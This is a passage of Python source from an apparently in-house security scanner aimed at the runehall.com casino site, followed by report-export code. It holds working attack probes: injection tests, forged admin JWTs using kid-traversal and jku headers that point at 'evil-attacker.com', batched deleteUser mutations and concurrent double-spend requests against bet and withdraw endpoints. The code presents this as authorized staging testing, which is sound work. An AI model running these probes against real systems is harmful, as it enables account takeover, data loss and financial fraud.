                        elif cls.startswith("xxe") and ("root:x:0" in body or re.search(r"uid=\d+", body)):
                            self._add("injection", finding(
                                "CRITICAL",
                                f"XXE: param {param!r} resolved an external entity (system file contents reflected) at {path}.",
                                fix="Disable DTD / external entity processing (FEATURE_SECURE_PROCESSING; disallow-doctype-decl).",
                                url=full, category="injection", param=param, kind=cls,
                                evidence="passwd/uid signature reflected", verdict=Verdict.FAIL.value))
                        elif cls == "cmdi" and (re.search(r"uid=\d+\(", body) or re.search(r"(?m)^root:", body)):
                            self._add("injection", finding(
                                "CRITICAL",
                                f"Command injection: param {param!r} executed an OS command (id/root output reflected) at {path}.",
                                fix="Never pass user input to a shell; use parameterized exec with an allowlist.",
                                url=full, category="injection", param=param, kind="cmdi",
                                evidence="uid=NN( or root: reflected", verdict=Verdict.FAIL.value))
                        elif cls == "nosqli" and ok2xx and len(body) > 200:
                            self._add("injection", finding(
                                "HIGH",
                                f"Possible NoSQL operator injection: {param}[{op_label}] accepted (2xx, body>200B) at {path}.",
                                fix="Reject query operators in user input; cast/validate types; use parameterized queries.",
                                url=full, category="injection", param=param, kind="nosqli",
                                evidence=f"status={r.status_code}, len={len(body)}", verdict=Verdict.FAIL.value))
                        elif cls == "ldapi" and ok2xx and re.search(r"(objectClass|distinguishedName|\bdn:\s|uid=)", body, re.I):
                            self._add("injection", finding(
                                "HIGH",
                                f"Possible LDAP injection: param {param!r} metacharacters accepted with directory-looking response at {path}.",
                                fix="Escape LDAP special characters; use parameterized LDAP filters.",
                                url=full, category="injection", param=param, kind="ldapi",
                                evidence="objectClass/dn/uid reflected", verdict=Verdict.FAIL.value))

    # ---- 3. GraphQL deep attacks -----------------------------------
    def test_graphql_deep(self) -> None:
        self.log.info("GraphQL deep attacks (introspection/suggestion/batching/depth)...")
        q_depth = "{ " + "node { " * 12 + "id" + " }" * 12 + " }"
        for path in GQL_PATHS:
            url = urljoin(self.cfg.target_url, path)
            if "runehall.com" not in url:
                continue
            try:
                r = self.http_post(url, json_body={"query": "query{__schema{queryType{name} types{name}}}"}, timeout=8)
                if r.status_code == 200 and "__schema" in (r.text or ""):
                    self._add("graphql_deep", finding(
                        "MEDIUM", f"GraphQL introspection enabled at {path}.",
                        fix="Disable introspection outside development.",
                        url=url, category="graphql_deep", attack="introspection",
                        evidence="__schema returned", verdict=Verdict.FAIL.value))
            except Exception:
                pass
            try:
                r = self.http_post(url, json_body={"query": "{ userx { id } }"}, timeout=8)
                if r.status_code in (200, 400) and re.search(r"Did you mean", r.text or "", re.I):
                    self._add("graphql_deep", finding(
                        "MEDIUM", f"GraphQL field-suggestion leak at {path} ('Did you mean' discloses schema).",
                        fix="Disable field suggestions / verbose errors in production.",
                        url=url, category="graphql_deep", attack="field_suggestion",
                        evidence="'Did you mean' in response", verdict=Verdict.FAIL.value))
            except Exception:
                pass
            try:
                batch = [{"query": "query{a:__typename}"}, {"query": "query{b:__typename}"}, {"query": "query{c:__typename}"}]
                r = self.http_post(url, json_body=batch, timeout=8)
                txt = r.text or ""
                if r.status_code == 200 and "__typename" in txt and '"errors"' not in txt:
                    self._add("graphql_deep", finding(
                        "HIGH",
                        f"GraphQL query batching accepted at {path} (aliased/batched ops run without error) — enables auth brute-force / rate-limit bypass.",
                        fix="Disable array batching or enforce per-operation auth + cost limits.",
                        url=url, category="graphql_deep", attack="batching",
                        evidence=f"batched {len(batch)} ops, no errors", verdict=Verdict.FAIL.value))
            except Exception:
                pass
            try:
                r = self.http_post(url, json_body={"query": q_depth}, timeout=8)
                txt = r.text or ""
                if r.status_code == 200 and '"errors"' not in txt and "depth" not in txt.lower():
                    self._add("graphql_deep", finding(
                        "MEDIUM",
                        f"GraphQL deep/nested query accepted at {path} (no depth limit) — DoS via query complexity.",
                        fix="Enforce query depth + complexity limits.",
                        url=url, category="graphql_deep", attack="depth_abuse", verdict=Verdict.FAIL.value))
            except Exception:
                pass
            # Destructive aliased deleteUser batch — gated behind RUN_STATEFUL
            if self.cfg.run_stateful:
                try:
                    batch = [{"query": 'mutation{a:deleteUser(id:"1"){id}}'},
                             {"query": 'mutation{b:deleteUser(id:"2"){id}}'}]
                    r = self.http_post(url, json_body=batch, headers=dict(self.auth_headers() or {}), timeout=8)
                    txt = r.text or ""
                    if r.status_code == 200 and '"errors"' not in txt and "deleteUser" in txt:
                        self._add("graphql_deep", finding(
                            "HIGH",
                            f"GraphQL batched mutation (aliased deleteUser) accepted at {path} without error.",
                            fix="Require object-level authz on mutations; disable batching of state-changing ops.",
                            url=url, category="graphql_deep", attack="batch_mutation", verdict=Verdict.FAIL.value))
                except Exception:
                    pass

    # ---- 4. SSRF (real, OOB-gated) ---------------------------------
    def test_ssrf_real(self, oob_host: Optional[str] = None) -> None:
        self.log.info("SSRF probes (OOB-gated; injects internal targets as app values only)...")
        oob = (oob_host or self._oob())
        if not oob:
            self.log.info("[skip] test_ssrf_real: no OOB collaborator host configured (AIO_OOB_HOST).")
            self._add("ssrf_real", finding(
                "INFO", "SSRF deep probe skipped: no OOB collaborator host (AIO_OOB_HOST) configured.",
                category="ssrf_real", verdict=Verdict.INCONCLUSIVE.value))
            return
        targets = [t.replace("OOB", oob) for t in SSRF_TARGETS]
        paths = self._candidate_api_paths() or ["/"]
        for path in paths[:12]:
            url = urljoin(self.cfg.target_url, path)
            if "runehall.com" not in url:
                continue
            for param in SSRF_PARAMS:
                for tgt in targets:
                    full = url + ("&" if "?" in url else "?") + urlencode({param: tgt})
                    try:
                        r = self.http_get(full, allow_redirects=False, timeout=8)
                    except Exception:
                        continue
                    body = (r.text or "")[:9000]
                    hit = [s for s in SSRF_SIGNATURES if s in body]
                    if hit:
                        self._add("ssrf_real", finding(
                            "CRITICAL",
                            f"SSRF: param {param!r} fetched internal target {tgt!r} — internal signature(s) {hit} reflected at {path}.",
                            fix="Allowlist outbound hosts; block link-local/loopback/metadata IPs; disable unused URL schemes (file/gopher/dict).",
                            url=full, category="ssrf_real", param=param, target=tgt,
                            evidence=",".join(hit), verdict=Verdict.FAIL.value))

    # ---- 5. JWT advanced (offline crack + gated forgery) -----------
    def _jwt_forgery_probe(self, forged: str, label: str) -> None:
        for p in JWT_PROBE_PATHS:
            url = urljoin(self.cfg.target_url, p)
            if "runehall.com" not in url:
                continue
            try:
                r = self.http_get(url, headers={"Authorization": f"Bearer {forged}"},
                                  allow_redirects=False, timeout=8)
            except Exception:
                continue
            if r.status_code == 200:
                self._add("jwt_advanced", finding(
                    "CRITICAL",
                    f"Forged JWT ({label}) accepted (200) at {p}.",
                    fix="Validate alg against an allowlist; ignore attacker-controlled kid/jku; verify with pinned keys.",
                    url=url, category="jwt_advanced", kind="forgery", evidence=label,
                    verdict=Verdict.FAIL.value))

    def test_jwt_advanced(self) -> None:
        self.log.info("Advanced JWT analysis (offline HS256 crack + gated kid/jku forgery)...")
        tok = self.cfg.user_a_jwt
        if not self.jwt_configured("A"):
            self._add("jwt_advanced", finding(
                "INFO", "No real USER_A_JWT configured — advanced JWT checks limited.",
                category="jwt_advanced", verdict=Verdict.INCONCLUSIVE.value))
            return
        # (a) offline HS256 dictionary crack (no network; passively safe)
        try:
            parts = tok.split(".")
            if len(parts) == 3:
                hpad = parts[0] + "=" * (-len(parts[0]) % 4)
                header = json.loads(base64.urlsafe_b64decode(hpad).decode("utf-8", "replace"))
                if str(header.get("alg", "")).upper() == "HS256":
                    signing_input = f"{parts[0]}.{parts[1]}".encode()
                    want = parts[2]
                    cracked = None
                    for word in JWT_WORDLIST:
                        sig = self._b64url(hmac.new(word.encode(), signing_input, hashlib.sha256).digest())
                        if hmac.compare_digest(sig, want):
                            cracked = word
                            break
                    if cracked is not None:
                        self._add("jwt_advanced", finding(
                            "CRITICAL",
                            f"JWT HS256 signing secret is weak/guessable: {cracked!r} (offline dictionary crack).",
                            fix="Rotate to a long random secret (>=256-bit) or RS256; never ship dictionary words.",
                            category="jwt_advanced", kind="weak_secret", evidence=f"secret={cracked!r}",
                            verdict=Verdict.FAIL.value))
                    else:
                        self._add("jwt_advanced", finding(
                            "INFO", "HS256 secret not in the small built-in wordlist (offline crack).",
                            category="jwt_advanced", kind="weak_secret", verdict=Verdict.PASS.value))
        except Exception as e:
            with self._report_lock:
                self.report["errors"].append(f"JWT offline crack error: {e}")
        # (b)(c) live forgery — gated behind RUN_STATEFUL
        if not self.cfg.run_stateful:
            self._add("jwt_advanced", finding(
                "INFO", "kid path-traversal/SQLi and jku remote-injection forgery are live; RUN_STATEFUL=False so they were not fired.",
                category="jwt_advanced", verdict=Verdict.INCONCLUSIVE.value))
            return
        oob = self._oob() or "evil-attacker.com"
        try:
            ppad = tok.split(".")[1] + "=" * (-len(tok.split(".")[1]) % 4)
            base_payload = json.loads(base64.urlsafe_b64decode(ppad).decode("utf-8", "replace"))
        except Exception:
            base_payload = {"sub": "1"}
        base_payload = dict(base_payload)
        base_payload["role"] = "admin"
        pay_b64 = self._b64url(json.dumps(base_payload, separators=(",", ":")).encode())
        # (b) kid path-traversal / SQLi forgery (HS256 signed with empty key)
        for kid in JWT_KID_PAYLOADS:
            k = kid.replace("OOB", oob)
            header = {"alg": "HS256", "typ": "JWT", "kid": k}
            signing_input = f"{self._b64url(json.dumps(header, separators=(',', ':')).encode())}.{pay_b64}"
            forged = signing_input + "." + self._b64url(hmac.new(b"", signing_input.encode(), hashlib.sha256).digest())
            self._jwt_forgery_probe(forged, f"kid={k!r}")
        # (c) jku remote-injection forgery pointing at the collaborator
        jku_header = {"alg": "RS256", "typ": "JWT", "jku": f"http://{oob}/jwks.json"}
        signing_input = f"{self._b64url(json.dumps(jku_header, separators=(',', ':')).encode())}.{pay_b64}"
        forged = signing_input + "." + self._b64url(b"forged-signature")
        self._jwt_forgery_probe(forged, f"jku=http://{oob}/jwks.json")

    # ---- 6. Casino race v2 (barrier-synchronized concurrent) -------
    def test_casino_race_v2(self, endpoint: Optional[str] = None, n: int = 20) -> None:
        self.log.info("Casino race v2 (threading.Barrier concurrent double-spend)...")
        if not self.cfg.run_stateful:
            self.log.info("[skip] RUN_STATEFUL=False — race v2 not fired.")
            return
        if not self.jwt_configured("A"):
            self.log.info("[skip] USER_A_JWT placeholder — race v2 not fired.")
            return
        targets: List[Tuple[str, str]] = []
        if endpoint:
            targets.append(("ENDPOINT", endpoint))
        else:
            for key in ("BET_ENDPOINT", "WITHDRAW_ENDPOINT"):
                path = self.cfg.casino_endpoints().get(key, "").strip()
                if path:
                    targets.append((key, path))
        if not targets:
            self.log.info("[skip] No BET/WITHDRAW endpoint configured for race v2.")
            return
        n = max(2, min(int(n), 50))
        body = {"amount": 0.01, "currency": "USD", "_probe": "aio-race-v2"}
        hdr = self.auth_headers()
        ua = f"Runehall-MaxAIO/{VERSION} (staging-authorized)"
        for key, path in targets:
            url = urljoin(self.cfg.target_url, path)
            if "runehall.com" not in url:
                continue
            self.log.info("Race v2: %s barrier-synchronized POSTs to %s (%s)...", n, key, path)
            barrier = threading.Barrier(n)
            results: List[Any] = []
            rlock = threading.Lock()

            def _worker() -> None:
                s = requests.Session()            # per-thread session (no sharing)
                s.headers.update({"User-Agent": ua})
                try:
                    barrier.wait(timeout=15)       # release all threads together
                    resp = s.post(url, headers=hdr, json=body, timeout=12)
                    code: Any = resp.status_code
                except Exception as e:
                    code = f"err:{e}"
                finally:
                    try:
                        s.close()
                    except Exception:
                        pass
                with rlock:
                    results.append(code)

            threads = [threading.Thread(target=_worker, daemon=True) for _ in range(n)]
            for t in threads:
                t.start()
            for t in threads:
                t.join(timeout=30)

            successes = [c for c in results if isinstance(c, int) and 200 <= c < 300]
            self.log.info("Race v2 %s: %s/%s success %s", key, len(successes), n, results)
            if len(successes) > 1:
                self._add("casino_race", finding(
                    "CRITICAL",
                    f"Race v2: {key} accepted {len(successes)}/{n} barrier-synchronized concurrent POSTs — double-spend / TOCTOU.",
                    fix="Serialize balance mutations (DB row lock / idempotency key / single-flight); reject duplicate in-flight bets.",
                    url=url, category="casino_race", statuses=results, concurrency=n,
                    verdict=Verdict.FAIL.value))
                self._add("race_conditions", finding(
                    "CRITICAL",
                    f"Casino race v2 on {key}: {len(successes)} concurrent successes of {n}.",
                    fix="Transactional locks or idempotency keys around balance-affecting endpoints.",
                    url=url, category="race_conditions"))
            else:
                self._add("casino_race", finding(
                    "INFO",
                    f"Race v2: {key} {len(successes)}/{n} concurrent successes — server appears to serialize/reject duplicates.",
                    fix="Confirm via staging balance audit that only one debit occurred.",
                    url=url, category="casino_race", statuses=results, concurrency=n,
                    verdict=Verdict.PASS.value))

    def _exit_code(self) -> int:
        sev = self.report.get("summary", {}).get("severity_breakdown", {})
        if self.report.get("errors") and not self.report.get("summary", {}).get("total_findings"):
            # Pure runtime failure with nothing useful
            if any("failed" == p.get("status") for p in self.report.get("phase_results", [])):
                return EXIT_RUNTIME_ERROR
        if sev.get("CRITICAL", 0) or sev.get("HIGH", 0):
            return EXIT_FINDINGS_HIGH
        return EXIT_OK

    # ------------------------------------------------------------------
    # Reporting: JSON + HTML + SARIF + Markdown
    # ------------------------------------------------------------------
    def _iter_findings(self) -> List[Tuple[str, Dict[str, Any]]]:
        out: List[Tuple[str, Dict[str, Any]]] = []
        for cat in self.REPORT_CATEGORIES:
            if cat in ("api_endpoints", "subdomains"):
                continue
            for item in self.report.get(cat, []):
                if isinstance(item, dict):
                    out.append((cat, tag_finding(cat, item)))
        return out

    def _severity_counts(self, findings: List[Tuple[str, Dict[str, Any]]]) -> Dict[str, int]:
        sev_counts = {"CRITICAL": 0, "HIGH": 0, "MEDIUM": 0, "LOW": 0, "INFO": 0}
        for _, f in findings:
            sev = str(f.get("severity", "INFO")).upper()
            sev_counts[sev] = sev_counts.get(sev, 0) + 1
        return sev_counts

    def generate_reports(self) -> None:
        end_time = _utc_now_iso()
        self.report["completed_at"] = end_time
        # v8: stamp deterministic ids + new/existing/fixed status before rendering
        stored, cur_ids = self._assign_ids_and_history()
        findings = self._iter_findings()
        sev_counts = self._severity_counts(findings)
        self.report["summary"] = {
            "total_findings": len(findings),
            "severity_breakdown": sev_counts,
            "api_endpoints_observed": len(self.report.get("api_endpoints") or []),
            "subdomains_found": len(self.report.get("subdomains") or []),
            "errors": len(self.report.get("errors") or []),
            "run_stateful": self.cfg.run_stateful,
            "version": VERSION,
            "phases_executed": self.report.get("phases_executed"),
            "business_logic_overall": (self.report.get("business_logic") or {}).get("overall_verdict"),
            "scorecard": self._scorecard(sev_counts),
            "history_delta": self.report.get("history_delta", {}),
        }

        prefix = self.cfg.output_prefix
        json_path = f"{prefix}.json"
        html_path = f"{prefix}.html"
        sarif_path = f"{prefix}.sarif"
        md_path = f"{prefix}.md"
        junit_path = f"{prefix}.junit.xml"
        dd_path = f"{prefix}.defectdojo.json"
        burp_path = f"{prefix}.burp.xml"
        pr_path = f"{prefix}.pr-comment.md"

        with open(json_path, "w") as f:
            json.dump(self.report, f, indent=2, default=str)
        with open(html_path, "w") as f:
            f.write(self._render_html(findings, sev_counts))
        with open(sarif_path, "w") as f:
            json.dump(self._render_sarif(findings), f, indent=2)
        with open(md_path, "w") as f:
            f.write(self._render_markdown(findings, sev_counts))
        with open(junit_path, "w") as f:
            f.write(self._render_junit(findings, sev_counts))
        with open(dd_path, "w") as f:
            json.dump(self._render_defectdojo(findings), f, indent=2, default=str)
        with open(burp_path, "w") as f:
            f.write(self._render_burp_xml(findings))
        with open(pr_path, "w") as f:
            f.write(self._render_pr_comment(findings, sev_counts))

        # v8: persist this run for next-run diffing
        self._save_history(cur_ids, stored)

        self.log.info("Reports: %s | %s | %s | %s", html_path, json_path, sarif_path, md_path)
        self.log.info("CI exports: %s | %s | %s | %s", junit_path, dd_path, burp_path, pr_path)
        hd = self.report.get("history_delta", {})
        self.log.info("Since last run: new=%s existing=%s fixed=%s",
                      hd.get("new", 0), hd.get("existing", 0), hd.get("fixed", 0))
        s = self.report["summary"]
        self.log.info(
            "COMPLETE. Findings: %s | CRITICAL: %s | HIGH: %s | MEDIUM: %s | "
            "BizLogic: %s | Subdomains: %s",
            s["total_findings"],
            sev_counts["CRITICAL"], sev_counts["HIGH"], sev_counts["MEDIUM"],
            s.get("business_logic_overall"), s["subdomains_found"],
        )

    def _scorecard(self, sev: Dict[str, int]) -> Dict[str, Any]:
        # Simple weighted score 0-100 (100 = clean). INFO ignored.
        penalty = sev.get("CRITICAL", 0) * 25 + sev.get("HIGH", 0) * 10 + sev.get("MEDIUM", 0) * 4 + sev.get("LOW", 0) * 1
        score = max(0, 100 - penalty)
        grade = "A" if score >= 90 else "B" if score >= 75 else "C" if score >= 60 else "D" if score >= 40 else "F"
        return {"score": score, "grade": grade, "penalty": penalty}

    def _esc(self, text: Any) -> str:
        s = str(text if text is not None else "")
        return (
            s.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")
            .replace('"', "&quot;")
        )


    def _render_html(self, findings: List[Tuple[str, Dict[str, Any]]], sev_counts: Dict[str, int]) -> str:
        score = self.report["summary"].get("scorecard", {})
        biz = self.report.get("business_logic") or {}

        # Group by category
        by_cat: Dict[str, List[Dict[str, Any]]] = {}
        for cat, f in findings:
            by_cat.setdefault(cat, []).append(f)

        def section(title: str, cat: str) -> str:
            items = by_cat.get(cat, [])
            if not items:
                return (
                    f'<details class="sec" data-sev="none"><summary><h2>{self._esc(title)}</h2> '
                    f'<span class="muted">No findings</span></summary></details>'
                )
            rows = []
            for item in items:
                sev = str(item.get("severity", "INFO")).upper()
                detail = item.get("detail") or item.get("evidence") or item.get("name") or str(item)
                matched = item.get("matched_at") or item.get("url") or ""
                fix = item.get("fix", "")
                owasp = item.get("owasp", "")
                cwe = item.get("cwe", "")
                verdict = item.get("verdict", "")
                tags = ""
                if owasp:
                    tags += f'<span class="tag">{self._esc(owasp)}</span>'
                if cwe:
                    tags += f'<span class="tag">{self._esc(cwe)}</span>'
                if verdict:
                    tags += f'<span class="tag verdict-{self._esc(verdict.lower())}">{self._esc(verdict)}</span>'
                rows.append(
                    f'<div class="finding {sev.lower()}" data-severity="{sev}">'
                    f'<strong>{sev}</strong> — {self._esc(detail)}'
                    f'{"<br><code>" + self._esc(matched) + "</code>" if matched else ""}'
                    f'{"<br><em>Remediation:</em> " + self._esc(fix) if fix else ""}'
                    f'{"<br>" + tags if tags else ""}'
                    f"</div>"
                )
            return (
                f'<details class="sec" open><summary><h2>{self._esc(title)} '
                f'<span class="badge">{len(items)}</span></h2></summary>{"".join(rows)}</details>'
            )

        phase_rows = "".join(
            f"<tr><td>{self._esc(p.get('name'))}</td><td>{self._esc(p.get('status'))}</td>"
            f"<td>{p.get('duration_s', 0):.2f}s</td><td>{self._esc(p.get('reason', ''))}</td></tr>"
            for p in self.report.get("phase_results", [])
        )
        filter_btns = "".join(
            f'<button type="button" class="fbtn" data-filter="{s}">{s} ({sev_counts.get(s, 0)})</button>'
            for s in ("ALL", "CRITICAL", "HIGH", "MEDIUM", "LOW", "INFO")
        )

        sections_html = "".join([
            section("JWT Structure", "jwt_analysis"),
            section("Auth JWT Forgery Attempts", "auth_jwt_forgery"),
            section("Auth Session Fixation", "auth_session_fixation"),
            section("Auth Cookie Flags", "auth_cookie_flags"),
            section("Auth OAuth / redirect_uri", "auth_oauth_redirect"),
            section("Verified BOLA / IDOR", "idor_bola"),
            section("Casino Race / Double-Spend", "casino_race"),
            section("Casino Payout / Odds Integrity", "casino_payout_integrity"),
            section("Casino Amount Validation", "casino_amount_validation"),
            section("Casino Bonus / Rollover", "casino_bonus_rollover"),
            section("Casino Free-Spin / Scatter", "casino_freespin_scatter"),
            section("Casino Provably-Fair Seeds", "casino_provably_fair"),
            section("Security Headers", "security_headers"),
            section("Open Redirects", "open_redirects"),
            section("JS Secrets", "js_secrets"),
            section("Reflected XSS Candidates", "reflected_xss_candidates"),
            section("SSRF Parameter Candidates", "ssrf_param_candidates"),
            section("HTTP Method Tampering", "http_method_tampering"),
            section("Rate Limiting", "rate_limiting"),
            section("Route Bypass", "route_bypass"),
            section("DOM XSS", "dom_xss"),
            section("Token Storage", "storage_exposure"),
            section("Nuclei", "nuclei_findings"),
            section("WebSocket", "websocket_findings"),
            section("GraphQL", "graphql_findings"),
            section("CORS", "cors_findings"),
            section("Prototype Pollution", "prototype_pollution"),
            section("postMessage", "postmessage_issues"),
            section("Race Conditions (generic)", "race_conditions"),
            section("Access-Control Matrix", "access_control_matrix"),
            section("Path / Encoding Auth Bypass", "path_bypass"),
            section("CSRF Posture", "csrf"),
            section("Mass Assignment", "mass_assignment"),
            section("Host-Header Injection", "host_header"),
            section("Subdomain Takeover", "subdomain_takeover"),
            section("HTTP Parameter Pollution", "hpp"),
            section("Injection (SSTI/XXE/CMDi/NoSQLi/LDAPi)", "injection"),
            section("GraphQL Deep Attacks", "graphql_deep"),
            section("SSRF (OOB-gated)", "ssrf_real"),
            section("JWT Advanced (crack / kid / jku)", "jwt_advanced"),
        ])

        sub_li = "".join(f"<li><code>{self._esc(s)}</code></li>" for s in (self.report.get("subdomains") or [])) or "<li>None</li>"
        api_li = "".join(f"<li><code>{self._esc(e)}</code></li>" for e in (self.report.get("api_endpoints") or [])) or "<li>None</li>"
        err_li = "".join(f"<li>{self._esc(e)}</li>" for e in (self.report.get("errors") or [])) or "<li>None</li>"

        return f"""<!DOCTYPE html>
<html lang="en"><head><meta charset="utf-8">
<title>Max AIO v{VERSION} — {self._esc(self.cfg.target_url)}</title>
<style>
:root {{ --bg:#0d1117; --card:#161b22; --text:#c9d1d9; --accent:#58a6ff; --border:#30363d; }}
body{{font-family:system-ui,-apple-system,sans-serif;background:var(--bg);color:var(--text);padding:32px;max-width:1200px;margin:auto;line-height:1.45}}
h1,h2{{color:var(--accent);margin:0}}
h2{{font-size:1.1rem;display:inline}}
.scorecard{{display:grid;grid-template-columns:repeat(auto-fit,minmax(140px,1fr));gap:12px;margin:20px 0}}
.card{{background:var(--card);border:1px solid var(--border);border-radius:8px;padding:14px}}
.card .big{{font-size:2rem;font-weight:700}}
.finding{{padding:12px;margin:8px 0;border-left:4px solid var(--border);background:var(--card);border-radius:4px}}
.critical{{border-left-color:#f85149}}.high{{border-left-color:#d29922}}
.medium{{border-left-color:#e3b341}}.low{{border-left-color:#8b949e}}.info{{border-left-color:#58a6ff}}
code{{color:#79c0ff;word-break:break-all}} em{{color:#8b949e}}
.badge{{display:inline-block;padding:2px 8px;border-radius:4px;background:#21262d;margin-left:8px;font-size:.8rem}}
.tag{{display:inline-block;padding:1px 6px;border-radius:3px;background:#21262d;margin:4px 4px 0 0;font-size:.75rem;color:#8b949e}}
.verdict-pass{{color:#3fb950}}.verdict-fail{{color:#f85149}}.verdict-inconclusive{{color:#e3b341}}
.filters{{margin:16px 0;display:flex;flex-wrap:wrap;gap:8px}}
.fbtn{{background:#21262d;color:var(--text);border:1px solid var(--border);border-radius:6px;padding:6px 10px;cursor:pointer}}
.fbtn.active,.fbtn:hover{{border-color:var(--accent);color:var(--accent)}}
details.sec{{margin:14px 0;border:1px solid var(--border);border-radius:8px;padding:8px 12px;background:#0d1117}}
summary{{cursor:pointer;list-style:none}} summary::-webkit-details-marker{{display:none}}
table{{width:100%;border-collapse:collapse;margin-top:8px}} th,td{{border:1px solid var(--border);padding:6px 8px;text-align:left}}
.muted{{color:#8b949e;font-size:.9rem}} .hidden{{display:none !important}}
</style></head><body>
<h1>Max AIO Red Ops Report v{VERSION}</h1>
<p>Target: <code>{self._esc(self.cfg.target_url)}</code><br>
<span class="badge">RUN_STATEFUL={self.cfg.run_stateful}</span>
<span class="badge">version={VERSION}</span>
<span class="badge">phases={self._esc(','.join(self.report.get('phases_executed') or []))}</span>
<span class="badge">staging-only authorized</span></p>

<div class="scorecard">
  <div class="card"><div class="muted">Score</div><div class="big">{score.get('score', '—')}</div><div>Grade {self._esc(score.get('grade', '—'))}</div></div>
  <div class="card"><div class="muted">Total</div><div class="big">{len(findings)}</div></div>
  <div class="card"><div class="muted">CRITICAL</div><div class="big" style="color:#f85149">{sev_counts['CRITICAL']}</div></div>
  <div class="card"><div class="muted">HIGH</div><div class="big" style="color:#d29922">{sev_counts['HIGH']}</div></div>
  <div class="card"><div class="muted">MEDIUM</div><div class="big" style="color:#e3b341">{sev_counts['MEDIUM']}</div></div>
  <div class="card"><div class="muted">Business Logic</div><div class="big">{self._esc(biz.get('overall_verdict', '—'))}</div></div>
</div>

<div class="filters" id="filters">{filter_btns}</div>

<details class="sec" open><summary><h2>Phase timing</h2></summary>
<table><thead><tr><th>Phase</th><th>Status</th><th>Duration</th><th>Reason</th></tr></thead>
<tbody>{phase_rows}</tbody></table></details>

{sections_html}

<details class="sec"><summary><h2>Subdomains</h2></summary><ul>{sub_li}</ul></details>
<details class="sec"><summary><h2>API Endpoints</h2></summary><ul>{api_li}</ul></details>
<details class="sec"><summary><h2>Errors</h2></summary><ul>{err_li}</ul></details>

<script>
(function(){{
  const btns = document.querySelectorAll('.fbtn');
  function apply(filter){{
    btns.forEach(b => b.classList.toggle('active', b.dataset.filter === filter));
    document.querySelectorAll('.finding').forEach(el => {{
      if (filter === 'ALL') el.classList.remove('hidden');
      else el.classList.toggle('hidden', el.dataset.severity !== filter);
    }});
  }}
  btns.forEach(b => b.addEventListener('click', () => apply(b.dataset.filter)));
  apply('ALL');
}})();
</script>
</body></html>"""

    def _render_junit(self, findings: List[Tuple[str, Dict[str, Any]]], sev_counts: Dict[str, int]) -> str:
        """JUnit XML for CI test reporters (CRITICAL/HIGH => failures)."""
        by_cat: Dict[str, List[Dict[str, Any]]] = {}
        for cat, f in findings:
            by_cat.setdefault(cat, []).append(f)
        total = len(findings)
        fails = sev_counts.get("CRITICAL", 0) + sev_counts.get("HIGH", 0)
        lines = ['<?xml version="1.0" encoding="UTF-8"?>']
        lines.append(f'<testsuites name="RunehallMaxAIO" tests="{total}" failures="{fails}">')
        for cat, items in sorted(by_cat.items()):
            c_fail = sum(1 for f in items if str(f.get("severity")).upper() in ("CRITICAL", "HIGH"))
            lines.append(f'  <testsuite name="{_xml.quoteattr(cat)[1:-1]}" tests="{len(items)}" failures="{c_fail}">')
            for f in items:
                sev = str(f.get("severity", "INFO")).upper()
                name = _xml.quoteattr(str(f.get("detail") or f.get("name") or cat)[:160])[1:-1]
                lines.append(f'    <testcase classname="{cat}" name="{name}">')
                if sev in ("CRITICAL", "HIGH"):
                    msg = _xml.quoteattr(f"{sev}: {f.get('fix', '')}"[:200])
                    body = _xml.escape(json.dumps(
                        {k: f.get(k) for k in ("severity", "url", "owasp", "cwe", "status", "id", "verdict")},
                        default=str))
                    lines.append(f'      <failure message={msg} type="{sev}">{body}</failure>')
                else:
                    lines.append(f'      <system-out>{_xml.escape(sev)}</system-out>')
                lines.append('    </testcase>')
            lines.append('  </testsuite>')
        lines.append('</testsuites>')
        return "\n".join(lines) + "\n"

    def _render_defectdojo(self, findings: List[Tuple[str, Dict[str, Any]]]) -> Dict[str, Any]:
        """DefectDojo 'Generic Findings Import' JSON (also usable in Burp->DefectDojo flows)."""
        sevmap = {"CRITICAL": "Critical", "HIGH": "High", "MEDIUM": "Medium", "LOW": "Low", "INFO": "Info"}
        out = []
        for cat, f in findings:
            sev = str(f.get("severity", "INFO")).upper()
            cwe_num = 0
            m = re.sub(r"\D", "", str(f.get("cwe", "")))
            if m:
                try:
                    cwe_num = int(m)
                except ValueError:
                    cwe_num = 0
            out.append({
                "title": str(f.get("detail") or f.get("name") or cat)[:250],
                "description": str(f.get("detail") or f.get("name") or cat),
                "severity": sevmap.get(sev, "Info"),
                "mitigation": f.get("fix", ""),
                "date": str(self.report.get("timestamp") or "")[:10],
                "cwe": cwe_num,
                "references": f.get("owasp", ""),
                "endpoints": [str(f.get("url") or f.get("matched_at") or self.cfg.target_url)],
                "unique_id_from_tool": f.get("id"),
                "vuln_id_from_tool": cat,
                "tags": ["staging-authorized", cat, str(f.get("status", ""))],
                "static_finding": False,
                "dynamic_finding": True,
                "active": sev in ("CRITICAL", "HIGH", "MEDIUM", "LOW"),
            })
        return {"findings": out}

    def _render_burp_xml(self, findings: List[Tuple[str, Dict[str, Any]]]) -> str:
        """Minimal Burp-style issues XML (importable by DefectDojo 'Burp Scan')."""
        sev_b = {"CRITICAL": "High", "HIGH": "High", "MEDIUM": "Medium", "LOW": "Low", "INFO": "Information"}
        host = self.cfg.target_url
        parts = ['<?xml version="1.0"?>',
                 f'<issues burpVersion="AIO-{VERSION}" exportTime="{_xml.escape(str(self.report.get("completed_at") or ""))}">']
        for cat, f in findings:
            sev = str(f.get("severity", "INFO")).upper()
            url = str(f.get("url") or f.get("matched_at") or host)
            parts.append("  <issue>")
            parts.append(f"    <name>{_xml.escape(str(f.get('detail') or f.get('name') or cat)[:180])}</name>")
            parts.append(f"    <host>{_xml.escape(host)}</host>")
            parts.append(f"    <path>{_xml.escape(urlparse(url).path or '/')}</path>")
            parts.append(f"    <location>{_xml.escape(url)}</location>")
            parts.append(f"    <severity>{sev_b.get(sev, 'Information')}</severity>")
            parts.append("    <confidence>Tentative</confidence>")
            parts.append(f"    <issueBackground>{_xml.escape(str(f.get('owasp', '')) + ' ' + str(f.get('cwe', '')))}</issueBackground>")
            parts.append(f"    <remediationBackground>{_xml.escape(str(f.get('fix', '')))}</remediationBackground>")
            parts.append(f"    <issueDetail>{_xml.escape(str(f.get('detail') or ''))}</issueDetail>")
            parts.append("  </issue>")
        parts.append("</issues>")
        return "\n".join(parts) + "\n"

    def _render_pr_comment(self, findings: List[Tuple[str, Dict[str, Any]]], sev_counts: Dict[str, int]) -> str:
        """Compact Markdown suitable for posting as a PR comment."""
        score = self.report["summary"].get("scorecard", {})
        delta = self.report.get("history_delta", {})
        fixed = self.report.get("fixed_since_last_run", [])
